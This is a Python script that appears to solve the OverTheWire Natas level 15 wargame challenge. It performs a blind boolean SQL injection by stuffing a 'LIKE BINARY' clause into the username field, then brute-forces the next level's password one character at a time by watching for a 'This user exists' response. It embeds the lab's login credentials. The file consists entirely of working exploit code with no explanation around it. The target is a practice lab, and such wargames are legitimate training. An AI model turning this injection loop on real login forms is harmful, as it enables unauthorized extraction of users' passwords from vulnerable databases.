#!/usr/bin/python3

import requests
from string import digits, ascii_lowercase, ascii_uppercase

url = "http://natas15.natas.labs.overthewire.org"

charset = ascii_lowercase + ascii_uppercase + digits
sqli = 'natas16" AND password LIKE BINARY "'
s = requests.Session()
s.auth = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')

password = ""

while len(password) < 32:
	for char in charset:
		r = s.post('http://natas15.natas.labs.overthewire.org/', data={'username':sqli + password + char + "%"})
		if "This user exists" in r.text:
			password += char
			print("[*] Found password so far:", password)
			break


print(password)

